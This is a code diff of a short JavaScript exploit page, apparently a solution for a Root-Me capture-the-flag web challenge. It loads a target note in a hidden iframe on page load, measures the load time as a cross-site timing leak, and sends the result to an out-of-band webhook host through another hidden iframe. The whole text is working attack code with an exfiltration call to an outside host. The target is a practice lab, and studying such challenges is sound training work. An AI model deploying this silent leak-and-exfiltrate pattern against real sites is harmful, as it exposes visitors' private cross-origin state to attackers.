@@ -2,20 +2,23 @@
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1376";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
-const iframe = document.createElement("iframe");
+window.onload = function () {
+    const iframe = document.createElement("iframe");
+    iframe.style.display = "none";
 
-const start = performance.now();
+    const start = performance.now();
 
-iframe.onload = function () {
-    const delta = performance.now() - start;
-    console.log("TIME:", delta);
+    iframe.onload = function () {
+        const delta = performance.now() - start;
+        console.log("TIME:", delta);
 
-    const ex = document.createElement("iframe");
-    ex.src = WEBHOOK + "?t=" + delta;
-    ex.style.display = "none";
-    document.body.appendChild(ex);
+        const ex = document.createElement("iframe");
+        ex.src = WEBHOOK + "?t=" + delta;
+        ex.style.display = "none";
+        document.body.appendChild(ex);
+    };
+
+    iframe.src = TARGET;
+    document.body.appendChild(iframe);
 };
-
-iframe.src = TARGET;
-document.body.appendChild(iframe);
 </script>
